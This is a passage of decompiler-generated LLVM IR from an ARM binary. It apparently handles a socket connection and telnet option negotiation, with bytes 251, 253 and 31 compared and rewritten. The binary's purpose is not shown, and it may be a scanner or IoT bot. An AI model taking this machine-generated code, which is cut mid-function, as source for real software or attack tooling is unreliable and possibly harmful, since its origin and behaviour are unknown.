  store i32 27, i32* %r0.global-to-local, align 4
  %v1_f844 = call i32 @function_fca0(i32 27)
  store i32 %v1_f844, i32* %r0.global-to-local, align 4
  %v0_f848 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f848 = icmp eq i32 %v0_f848, 0
  store i1 %v2_f848, i1* %cpsr_z.global-to-local, align 1
  %tmp453 = icmp slt i32 %v0_f848, 1
  br i1 %tmp453, label %dec_label_pc_f728, label %dec_label_pc_f8dc

dec_label_pc_f854:                                ; preds = %dec_label_pc_f2c0
  store i32 ptrtoint (i32* @global_var_16000.187 to i32), i32* @r1, align 4
  store i32 3, i32* @r2, align 4
  store i32 %v2_f858, i32* @r0, align 4
  %v0_f870 = call i32 @function_11110()
  store i32 9, i32* @r2, align 4
  store i32 %v2_f86c, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_15ff7.189 to i32), i32* @r1, align 4
  %v0_f880 = call i32 @function_11110()
  store i32 %v0_f880, i32* %r0.global-to-local, align 4
  %v0_f884 = load i32, i32* @r6, align 4
  %v1_f884 = add i32 %v0_f884, 24
  %v2_f884 = inttoptr i32 %v1_f884 to i32*
  %v3_f884 = load i32, i32* %v2_f884, align 4
  %v0_f888 = load i32, i32* @r4, align 4
  %v1_f888 = add i32 %v0_f888, 2
  store i32 %v1_f888, i32* %r2.global-to-local, align 4
  %v0_f88c = load i32, i32* %sb.global-to-local, align 4
  %v2_f88c = add i32 %v0_f88c, %v3_f884
  store i32 %v2_f88c, i32* @r3, align 4
  %v3_f890 = icmp uge i32 %v2_f88c, %v1_f888
  store i1 %v3_f890, i1* %cpsr_c.global-to-local, align 1
  %v9_f890 = icmp eq i32 %v2_f88c, %v1_f888
  store i1 %v9_f890, i1* %cpsr_z.global-to-local, align 1
  %v2_f894 = xor i1 %v3_f890, true
  %v3_f894 = or i1 %v9_f890, %v2_f894
  br i1 %v3_f894, label %dec_label_pc_f854.dec_label_pc_f33c.loopexit_crit_edge, label %dec_label_pc_f898

dec_label_pc_f854.dec_label_pc_f33c.loopexit_crit_edge: ; preds = %dec_label_pc_f854
  %v0_f33c.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_f33c

dec_label_pc_f898:                                ; preds = %dec_label_pc_f854
  %v2_f898 = inttoptr i32 %v1_f888 to i8*
  %v3_f898 = load i8, i8* %v2_f898, align 1
  %v4_f898 = zext i8 %v3_f898 to i32
  store i32 %v4_f898, i32* %r3.global-to-local, align 4
  %v2_f89c = icmp ugt i8 %v3_f898, 30
  store i1 %v2_f89c, i1* %cpsr_c.global-to-local, align 1
  %v7_f89c = icmp eq i8 %v3_f898, 31
  store i1 %v7_f89c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f89c, label %dec_label_pc_f9cc, label %dec_label_pc_f8a4

dec_label_pc_f8a4:                                ; preds = %dec_label_pc_f898
  %v1_f8a4 = inttoptr i32 %v0_f888 to i8*
  %v2_f8a4 = load i8, i8* %v1_f8a4, align 1
  %v3_f8a4 = zext i8 %v2_f8a4 to i32
  store i32 %v3_f8a4, i32* %r3.global-to-local, align 4
  %v2_f8a8 = icmp ugt i8 %v2_f8a4, -4
  store i1 %v2_f8a8, i1* %cpsr_c.global-to-local, align 1
  %v7_f8a8 = icmp eq i8 %v2_f8a4, -3
  store i1 %v7_f8a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8a8, label %.thread138, label %dec_label_pc_f8b8

.thread138:                                       ; preds = %dec_label_pc_f8a4
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_f8a4, align 1
  %v0_f8b4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f8b4.pr.pr, label %dec_label_pc_f2d4, label %.thread138.dec_label_pc_f8b8thread-pre-split_crit_edge

.thread138.dec_label_pc_f8b8thread-pre-split_crit_edge: ; preds = %.thread138
  %v0_f8b8.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f8b8

dec_label_pc_f8b8:                                ; preds = %dec_label_pc_f8a4, %.thread138.dec_label_pc_f8b8thread-pre-split_crit_edge
  %v0_f8b8.pr = phi i32 [ %v0_f8b8.pr.pre, %.thread138.dec_label_pc_f8b8thread-pre-split_crit_edge ], [ %v3_f8a4, %dec_label_pc_f8a4 ]
  %v2_f8b8 = icmp ugt i32 %v0_f8b8.pr, 250
  store i1 %v2_f8b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f8b8 = icmp eq i32 %v0_f8b8.pr, 251
  store i1 %v7_f8b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f8b8, label %bb454, label %dec_label_pc_f2d4

bb454:                                            ; preds = %dec_label_pc_f8b8
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_f8c0 = load i32, i32* @r4, align 4
  %v4_f8c0 = inttoptr i32 %v3_f8c0 to i8*
  store i8 -3, i8* %v4_f8c0, align 1
  br label %dec_label_pc_f2d4

dec_label_pc_f8c8:                                ; preds = %dec_label_pc_f77c, %dec_label_pc_f79c, %dec_label_pc_f794, %dec_label_pc_f78c, %bb452, %dec_label_pc_f768, %dec_label_pc_f744, %dec_label_pc_f760, %dec_label_pc_f758, %bb451
  %v0_f8cc = phi i32 [ %v1_f738, %dec_label_pc_f768 ], [ %v1_f738, %dec_label_pc_f744 ], [ %v1_f738, %dec_label_pc_f760 ], [ %v1_f738, %dec_label_pc_f758 ], [ %v1_f738, %bb451 ], [ %v1_f7a8, %bb452 ], [ %v1_f7a8, %dec_label_pc_f78c ], [ %v1_f7a8, %dec_label_pc_f794 ], [ %v1_f7a8, %dec_label_pc_f79c ], [ %v1_f7a8, %dec_label_pc_f77c ]
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_f8cc = add i32 %v0_f8cc, 1
  store i32 %v1_f8cc, i32* @r7, align 4
  %v1_f8d0 = call i32 @function_fca0(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_f8d8 = call i32 @function_fca0(i32 27)
  store i32 %v1_f8d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f8dc

dec_label_pc_f8dc:                                ; preds = %dec_label_pc_f838, %dec_label_pc_f8c8
  %v0_f8dc = load i32, i32* @r6, align 4
  %v1_f8dc = inttoptr i32 %v0_f8dc to i32*
  %v2_f8dc = load i32, i32* %v1_f8dc, align 4
  store i32 %v2_f8dc, i32* %r3.global-to-local, align 4
  %v1_f8e0 = add i32 %v0_f8dc, 4
  %v2_f8e0 = inttoptr i32 %v1_f8e0 to i32*
  %v3_f8e0 = load i32, i32* %v2_f8e0, align 4
  store i32 %v3_f8e0, i32* %r0.global-to-local, align 4
  %v1_f8e4 = add i32 %v2_f8dc, 12
  %v2_f8e4 = inttoptr i32 %v1_f8e4 to i8*
  %v3_f8e4 = load i8, i8* %v2_f8e4, align 1
  %v4_f8e4 = zext i8 %v3_f8e4 to i32
  store i32 %v4_f8e4, i32* %r2.global-to-local, align 4
  %v1_f8e8 = inttoptr i32 %v2_f8dc to i32*
  %v2_f8e8 = load i32, i32* %v1_f8e8, align 4
  store i32 %v2_f8e8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f8f0 = call i32 @function_11300(i32 %v3_f8e0, i32 %v2_f8e8, i32 %v4_f8e4, i32 16384)
  store i32 %v4_f8f0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f8f8 = load i32, i32* @r6, align 4
  %v1_f8f8 = add i32 %v0_f8f8, 4
  %v2_f8f8 = inttoptr i32 %v1_f8f8 to i32*
  %v3_f8f8 = load i32, i32* %v2_f8f8, align 4
  store i32 %v3_f8f8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_15ff4.185 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_f904 = call i32 @function_11300(i32 %v3_f8f8, i32 ptrtoint ([3 x i8]* @global_var_15ff4.185 to i32), i32 2, i32 16384)
  store i32 %v4_f904, i32* %r0.global-to-local, align 4
  store i32 4, i32* @r3, align 4
  %v1_f90c = load i32, i32* @r6, align 4
  %v2_f90c = add i32 %v1_f90c, 12
  %v3_f90c = inttoptr i32 %v2_f90c to i32*
  store i32 4, i32* %v3_f90c, align 4
  br label %dec_label_pc_f728

dec_label_pc_f914:                                ; preds = %dec_label_pc_f680, %dec_label_pc_f698, %dec_label_pc_f690, %bb448, %dec_label_pc_f66c, %dec_label_pc_f650, %dec_label_pc_f664, %bb447
  %v0_f918 = phi i32 [ %v1_f644, %dec_label_pc_f66c ], [ %v1_f644, %dec_label_pc_f650 ], [ %v1_f644, %dec_label_pc_f664 ], [ %v1_f644, %bb447 ], [ %v1_f6a4, %bb448 ], [ %v1_f6a4, %dec_label_pc_f690 ], [ %v1_f6a4, %dec_label_pc_f698 ], [ %v1_f6a4, %dec_label_pc_f680 ]
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_f918 = add i32 %v0_f918, 1
  store i32 %v1_f918, i32* @r7, align 4
  %v1_f91c = call i32 @function_fca0(i32 25)
  br label %dec_label_pc_f6f4

dec_label_pc_f924:                                ; preds = %dec_label_pc_f030
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f930 = call i32 @function_fd40(i32 9)
  store i32 %v2_f7c4, i32* %r1.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v3_f940 = call i32 @function_fc7c(i32 9, i32* nonnull %stack_var_-60)
  store i32 %v3_f940, i32* %r0.global-to-local, align 4
  %v3_f944 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_f940, i32* %r2.global-to-local, align 4
  %v1_f94c = add i32 %v3_f944, -1
  store i32 %v1_f94c, i32* %r3.global-to-local, align 4
  %v0_f950 = load i32, i32* @r6, align 4
  %v1_f950 = add i32 %v0_f950, 24
  %v2_f950 = inttoptr i32 %v1_f950 to i32*
  %v3_f950 = load i32, i32* %v2_f950, align 4
  store i32 %v3_f950, i32* %r1.global-to-local, align 4
  %v0_f954 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_f954, i32* %r0.global-to-local, align 4
  %v4_f958 = call i32 @function_101d8(i32 %v0_f954, i32 %v3_f950, i32 %v3_f940, i32 %v1_f94c)
  store i32 %v4_f958, i32* @r7, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_f964 = call i32 @function_fca0(i32 9)
  store i32 %v1_f964, i32* @r0, align 4
  %v0_f968 = load i32, i32* @r7, align 4
  %v2_f968 = icmp eq i32 %v0_f968, -1
  store i1 %v2_f968, i1* %cpsr_c.global-to-local, align 1
  %v7_f968 = icmp eq i32 %v0_f968, -1
  store i1 %v7_f968, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f968, label %dec_label_pc_ef10.loopexit, label %dec_label_pc_f970

dec_label_pc_f970:                                ; preds = %dec_label_pc_f924
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f970 = icmp eq i32 %v0_f968, 0
  store i1 %v2_f970, i1* %cpsr_z.global-to-local, align 1
  %tmp455 = icmp slt i32 %v0_f968, 1
  br i1 %tmp455, label %dec_label_pc_f728, label %dec_label_pc_f978

dec_label_pc_f978:                                ; preds = %dec_label_pc_f970
  %v0_f978 = load i32, i32* @r6, align 4
  %v1_f978 = add i32 %v0_f978, 20
  %v2_f978 = inttoptr i32 %v1_f978 to i16*
  %v3_f978 = load i16, i16* %v2_f978, align 2
  %v4_f978 = zext i16 %v3_f978 to i32
  store i32 %v4_f978, i32* %r3.global-to-local, align 4
  %v1_f97c = add i32 %v0_f978, 16
  %v2_f97c = inttoptr i32 %v1_f97c to i32*
  %v3_f97c = load i32, i32* %v2_f97c, align 4
  store i32 %v3_f97c, i32* %r2.global-to-local, align 4
  store i32 %v2_f980, i32* @ip, align 4
  store i32 %v4_f978, i32* %stack_var_-42, align 4
  store i32 %v3_f97c, i32* %stack_var_-60, align 4
  %v1_f98c = inttoptr i32 %v0_f978 to i32*
  %v2_f98c = load i32, i32* %v1_f98c, align 4
  store i32 %v2_f98c, i32* @r8, align 4
  %v0_f990 = call i32 @function_108d0()
  store i32 %v0_f990, i32* %r0.global-to-local, align 4
  %v7_f994 = icmp eq i32 %v0_f990, -1
  %.465 = zext i1 %v7_f994 to i32
  store i32 %.465, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9a0 = icmp eq i32 %v0_f990, 0
  store i1 %v2_f9a0, i1* %cpsr_z.global-to-local, align 1
  %tmp458 = icmp slt i32 %v0_f990, 1
  br i1 %tmp458, label %bb459, label %.thread144

.thread144:                                       ; preds = %dec_label_pc_f978
  store i32 1, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f9b4

bb459:                                            ; preds = %dec_label_pc_f978
  store i32 %.465, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f9ac = icmp eq i1 %v7_f994, false
  store i1 %v2_f9ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f9ac, label %dec_label_pc_fb3c, label %dec_label_pc_f9b4

dec_label_pc_f9b4:                                ; preds = %.thread144, %bb459
  %v0_f9b4 = load i32, i32* @r6, align 4
  %v1_f9b4 = add i32 %v0_f9b4, 4
  %v2_f9b4 = inttoptr i32 %v1_f9b4 to i32*
  %v3_f9b4 = load i32, i32* %v2_f9b4, align 4
  store i32 %v3_f9b4, i32* %r0.global-to-local, align 4
  %v1_f9b8 = call i32 @function_10be0(i32 %v3_f9b4)
  store i32 %v1_f9b8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r3, align 4
  %v0_f9c0 = load i32, i32* @r4, align 4
  %v1_f9c0 = load i32, i32* @r6, align 4
  %v2_f9c0 = add i32 %v1_f9c0, 4
  %v3_f9c0 = inttoptr i32 %v2_f9c0 to i32*
  store i32 %v0_f9c0, i32* %v3_f9c0, align 4
  %v0_f9c4 = load i32, i32* @r3, align 4
  %v1_f9c4 = load i32, i32* @r6, align 4
  %v2_f9c4 = add i32 %v1_f9c4, 12
  %v3_f9c4 = inttoptr i32 %v2_f9c4 to i32*
  store i32 %v0_f9c4, i32* %v3_f9c4, align 4
  br label %dec_label_pc_f728

dec_label_pc_f9cc:                                ; preds = %dec_label_pc_f898
  store i32 %v2_f858, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v1_f9d8 = add i32 %v0_f884, 4
  %v2_f9d8 = inttoptr i32 %v1_f9d8 to i32*
  %v3_f9d8 = load i32, i32* %v2_f9d8, align 4
  store i32 %v3_f9d8, i32* %r0.global-to-local, align 4
  %v4_f9dc = call i32 @function_11300(i32 %v3_f9d8, i32 %v2_f858, i32 3, i32 16384)
  store i32 %v4_f9dc, i32* %r0.global-to-local, align 4
  %v0_f9e0 = load i32, i32* @r6, align 4
  %v1_f9e0 = add i32 %v0_f9e0, 4
  %v2_f9e0 = inttoptr i32 %v1_f9e0 to i32*
  %v3_f9e0 = load i32, i32* %v2_f9e0, align 4
  store i32 %v3_f9e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f320

dec_label_pc_f9f0:                                ; preds = %dec_label_pc_ef1c
  store i32 %.pre282, i32* @r0, align 4
  %v1_f9f8 = add i32 %v0_f9f0, 92
  store i32 %v1_f9f8, i32* @r1, align 4
  store i32 192, i32* @r2, align 4
  %v3_fa00 = call i32 @function_11100(i32 %.pre282, i32 %v1_f9f8, i32 192)
  store i32 %v3_fa00, i32* %r0.global-to-local, align 4
  %v0_fa04 = load i32, i32* @r6, align 4
  %v1_fa04 = add i32 %v0_fa04, 24
  %v2_fa04 = inttoptr i32 %v1_fa04 to i32*
  %v3_fa04 = load i32, i32* %v2_fa04, align 4
  %v1_fa08 = add i32 %v3_fa04, -64
  store i32 %v1_fa08, i32* %r3.global-to-local, align 4
  store i32 %v1_fa08, i32* %v2_fa04, align 4
  br label %dec_label_pc_ef2c

dec_label_pc_fa14:                                ; preds = %dec_label_pc_f06c
  %v0_fa14 = load i32, i32* @r6, align 4
  store i32 %v0_fa14, i32* @r0, align 4
  %v0_fa18 = call i32 @function_e304()
  store i32 %v0_fa18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f0a8

dec_label_pc_fa20:                                ; preds = %dec_label_pc_eed4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-60, align 4
  store i32 %v2_e644, i32* %r3.global-to-local, align 4
  store i32 %v2_f7c4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i8 0, i8* %stack_var_-56, align 1
  %v5_fa48 = call i32 @function_11214(i32 %v3_eec8, i32 1, i32 4, i32 %v2_e644, i32 %v2_f7c4)
  %v3_fa4c = load i8, i8* %stack_var_-56, align 1
  %v4_fa4c = sext i8 %v3_fa4c to i32
  store i32 %v4_fa4c, i32* %r3.global-to-local, align 4
  %v2_fa50 = or i32 %v4_fa4c, %v5_fa48
  store i32 %v2_fa50, i32* %r0.global-to-local, align 4
  %v4_fa50 = icmp eq i32 %v2_fa50, 0
  store i1 %v4_fa50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_fa50, label %dec_label_pc_fa58, label %dec_label_pc_fb04

dec_label_pc_fa58:                                ; preds = %dec_label_pc_fa20
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_fa5c = load i32, i32* @r6, align 4
  %v2_fa5c = add i32 %v1_fa5c, 12
  %v3_fa5c = inttoptr i32 %v2_fa5c to i32*
  store i32 2, i32* %v3_fa5c, align 4
  %v0_fa60 = call i32 @function_e094()
  store i32 %v0_fa60, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i16** @global_var_1e748.125 to i32), i32* %r3.global-to-local, align 4
  %v2_fa68 = load i16, i16* bitcast (i16** @global_var_1e748.125 to i16*), align 4
  %v3_fa68 = zext i16 %v2_fa68 to i32
  store i32 %v3_fa68, i32* %r1.global-to-local, align 4
  %v3_fa6c = call i32 @function_10778(i32 %v0_fa60, i32 %v3_fa68)
  store i32 %v3_fa6c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1e718.121 to i32), i32* %r3.global-to-local, align 4
  %v2_fa74 = load i32, i32* @global_var_1e718.121, align 4
  store i32 %v2_fa74, i32* %ip.global-to-local, align 4
  %v1_fa7c = load i32, i32* @r4, align 4
  %v9_fa7c = icmp eq i32 %v2_fa74, %v1_fa7c
  store i1 %v9_fa7c, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v3_fa68, i32* %r1.global-to-local, align 4
  %v7_fa84 = icmp sgt i32 %v2_fa74, %v1_fa7c
  br i1 %v7_fa84, label %dec_label_pc_fa88, label %dec_label_pc_fac8

dec_label_pc_fa88:                                ; preds = %dec_label_pc_fa58
  %v2_fa8c = load i32, i32* @global_var_1e744.123, align 4
  store i32 %v2_fa8c, i32* %r3.global-to-local, align 4
  store i32 %v1_fa7c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_faa8

dec_label_pc_fa98:                                ; preds = %dec_label_pc_fab8, %dec_label_pc_faa8
  %v1_fa98 = add i32 %v0_fa98, 1
  store i32 %v1_fa98, i32* %r2.global-to-local, align 4
  %v9_fa9c = icmp eq i32 %v1_fa98, %v2_fa74
  %v1_faa0 = add i32 %v0_faa0, 16
  store i32 %v1_faa0, i32* %r3.global-to-local, align 4
  br i1 %v9_fa9c, label %dec_label_pc_fac8.loopexit, label %dec_label_pc_faa8

dec_label_pc_faa8:                                ; preds = %dec_label_pc_fa98, %dec_label_pc_fa88
  %v0_fa98 = phi i32 [ %v1_fa98, %dec_label_pc_fa98 ], [ %v1_fa7c, %dec_label_pc_fa88 ]
  %v0_faa0 = phi i32 [ %v1_faa0, %dec_label_pc_fa98 ], [ %v2_fa8c, %dec_label_pc_fa88 ]
  store i32 %v0_faa0, i32* %r0.global-to-local, align 4
  %v1_faac = add i32 %v0_faa0, 8
  %v2_faac = inttoptr i32 %v1_faac to i16*
  %v3_faac = load i16, i16* %v2_faac, align 2
  %v4_faac = zext i16 %v3_faac to i32
  store i32 %v4_faac, i32* %r3.global-to-local, align 4
  %tmp460 = icmp ugt i16 %v3_faac, %v2_fa68
  br i1 %tmp460, label %dec_label_pc_fa98, label %dec_label_pc_fab8

dec_label_pc_fab8:                                ; preds = %dec_label_pc_faa8
  %v1_fab8 = add i32 %v0_faa0, 10
  %v2_fab8 = inttoptr i32 %v1_fab8 to i16*
  %v3_fab8 = load i16, i16* %v2_fab8, align 2
  %v4_fab8 = zext i16 %v3_fab8 to i32
  store i32 %v4_fab8, i32* %r3.global-to-local, align 4
  %v3_fabc = icmp uge i16 %v3_fab8, %v2_fa68
  %v9_fabc = icmp eq i16 %v3_fab8, %v2_fa68
  %v2_fac0 = xor i1 %v3_fabc, true
  %v3_fac0 = or i1 %v9_fabc, %v2_fac0
  br i1 %v3_fac0, label %dec_label_pc_fa98, label %dec_label_pc_facc.loopexit

dec_label_pc_fac8.loopexit:                       ; preds = %dec_label_pc_fa98
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fac8

dec_label_pc_fac8:                                ; preds = %dec_label_pc_fac8.loopexit, %dec_label_pc_fa58
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_facc

dec_label_pc_facc.loopexit:                       ; preds = %dec_label_pc_fab8
  store i1 %v3_fabc, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_facc

dec_label_pc_facc:                                ; preds = %dec_label_pc_facc.loopexit, %dec_label_pc_fac8
  %v0_fae0 = phi i32 [ %v0_faa0, %dec_label_pc_facc.loopexit ], [ 0, %dec_label_pc_fac8 ]
  %v0_facc = load i32, i32* @r6, align 4
  %v1_facc = add i32 %v0_facc, 4
  %v2_facc = inttoptr i32 %v1_facc to i32*
  %v3_facc = load i32, i32* %v2_facc, align 4
  %v3_fad0 = udiv i32 %v3_facc, 32
  store i32 %v3_fad0, i32* %r2.global-to-local, align 4
  %v1_fad4 = urem i32 %v3_facc, 32
  store i32 %v1_fad4, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_fad8 = mul nuw nsw i32 %v3_fad0, 4
  store i32 %v3_fad8, i32* @ip, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_fae0 = inttoptr i32 %v0_facc to i32*
  store i32 %v0_fae0, i32* %v2_fae0, align 4
  %v0_fae4 = load i32, i32* %r3.global-to-local, align 4
  %v1_fae4 = load i32, i32* @r6, align 4
  %v2_fae4 = add i32 %v1_fae4, 24
  %v3_fae4 = inttoptr i32 %v2_fae4 to i32*
  store i32 %v0_fae4, i32* %v3_fae4, align 4
  %v0_eefc.pre = load i32, i32* @ip, align 4
  %v1_ef04.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_eef8

dec_label_pc_faec:                                ; preds = %dec_label_pc_f810
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_faf0 = call i32 @function_fca0(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_faf8 = call i32 @function_fca0(i32 27)
  store i32 %v1_faf8, i32* %r0.global-to-local, align 4
  %v0_fafc = load i32, i32* @r6, align 4
  %v1_fafc = add i32 %v0_fafc, 12
  %v2_fafc = inttoptr i32 %v1_fafc to i32*
  %v3_fafc = load i32, i32* %v2_fafc, align 4
  store i32 %v3_fafc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ef14.backedge

dec_label_pc_fb04:                                ; preds = %dec_label_pc_fa20
  %v0_fb04 = load i32, i32* @r6, align 4
  %v1_fb04 = add i32 %v0_fb04, 4
  %v2_fb04 = inttoptr i32 %v1_fb04 to i32*
  %v3_fb04 = load i32, i32* %v2_fb04, align 4
  store i32 %v3_fb04, i32* %r0.global-to-local, align 4
  %v1_fb08 = call i32 @function_10be0(i32 %v3_fb04)
  store i32 %v1_fb08, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_fb10 = load i32, i32* @r4, align 4
  %v1_fb10 = load i32, i32* @r6, align 4
  %v2_fb10 = add i32 %v1_fb10, 12
  %v3_fb10 = inttoptr i32 %v2_fb10 to i32*
  store i32 %v0_fb10, i32* %v3_fb10, align 4
  %v0_fb14 = load i32, i32* %r3.global-to-local, align 4
  %v1_fb14 = load i32, i32* @r6, align 4
  %v2_fb14 = add i32 %v1_fb14, 4
  %v3_fb14 = inttoptr i32 %v2_fb14 to i32*
  store i32 %v0_fb14, i32* %v3_fb14, align 4
  %v0_fb18 = load i32, i32* @r4, align 4
  %v1_fb18 = trunc i32 %v0_fb18 to i8
  %v2_fb18 = load i32, i32* @r6, align 4
  %v3_fb18 = add i32 %v2_fb18, 284
  %v4_fb18 = inttoptr i32 %v3_fb18 to i8*
  store i8 %v1_fb18, i8* %v4_fb18, align 1
  br label %dec_label_pc_f018

dec_label_pc_fb20:                                ; preds = %dec_label_pc_efc8
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_fb24 = load i32, i32* %fp.global-to-local, align 4
  %v2_fb24 = inttoptr i32 %v1_fb24 to i32*
  store i32 104, i32* %v2_fb24, align 4
  br label %dec_label_pc_efe0

dec_label_pc_fb2c:                                ; preds = %thread-pre-split124
  store i32 %v1_fb30, i32* %r0.global-to-local, align 4
  %v0_fb34 = load i32, i32* @r6, align 4
  %v1_fb34 = add i32 %v0_fb34, 12
  %v2_fb34 = inttoptr i32 %v1_fb34 to i32*
  %v3_fb34 = load i32, i32* %v2_fb34, align 4
  store i32 %v3_fb34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ef14.backedge

dec_label_pc_ef14.backedge.thread:                ; preds = %dec_label_pc_f0d4, %dec_label_pc_f1a8, %dec_label_pc_f34c, %dec_label_pc_f420, %dec_label_pc_f56c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef1c

dec_label_pc_ef14.backedge.thread561:             ; preds = %dec_label_pc_f484, %dec_label_pc_f3b0, %dec_label_pc_f5d0, %dec_label_pc_f20c, %dec_label_pc_f138
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef1c

dec_label_pc_ef14.backedge:                       ; preds = %dec_label_pc_ef90, %dec_label_pc_fb2c, %dec_label_pc_faec
  %v0_ef1c228 = phi i32 [ %v0_fafc, %dec_label_pc_faec ], [ %v0_fb34, %dec_label_pc_fb2c ], [ %v0_ef90, %dec_label_pc_ef90 ]
  %v0_ef14.be = phi i32 [ %v3_fafc, %dec_label_pc_faec ], [ %v3_fb34, %dec_label_pc_fb2c ], [ %v3_ef90, %dec_label_pc_ef90 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef14 = icmp eq i32 %v0_ef14.be, 0
  store i1 %v2_ef14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef14, label %dec_label_pc_f018, label %dec_label_pc_ef1c

dec_label_pc_fb3c:                                ; preds = %bb459
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_fb48 = call i32 @function_113bc(i32 2, i32 1, i32 0)
  store i32 %v3_fb48, i32* %r0.global-to-local, align 4
  %v2_fb4c = icmp eq i32 %v3_fb48, -1
  store i1 %v2_fb4c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb4c = icmp eq i32 %v3_fb48, -1
  store i1 %v7_fb4c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_fb48, i32* @r4, align 4
  br i1 %v7_fb4c, label %dec_label_pc_fbd0, label %dec_label_pc_fb58

dec_label_pc_fb58:                                ; preds = %dec_label_pc_fb3c
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_fb5c = call i32 @function_fd40(i32 2)
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_15f50.74 to i32), i32* @r0, align 4
  %v2_fb70 = call i32 @function_11144(i32 ptrtoint ([15 x i8]* @global_var_15f50.74 to i32))
  %v0_fb74 = load i32, i32* @r5, align 4
  store i32 %v0_fb74, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_fb80 = inttoptr i32 %v0_fb74 to i32*
  %v3_fb80 = call i32 @function_fc7c(i32 2, i32* %v2_fb80)
  store i32 %v2_f980, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_fb94 = call i32 @function_fca0(i32 2)
  %v0_fb9c = load i32, i32* @r4, align 4
  store i32 %v0_fb9c, i32* %r0.global-to-local, align 4
  store i32 %v2_e850, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_fba8 = call i32 @function_111a4(i32 %v0_fb9c, i32 %v2_e850, i32 16)
  store i32 %v3_fba8, i32* %r0.global-to-local, align 4
  %v3_fbac = icmp eq i32 %v3_fba8, -1
  store i1 %v3_fbac, i1* %cpsr_c.global-to-local, align 1
  %v8_fbac = icmp eq i32 %v3_fba8, -1
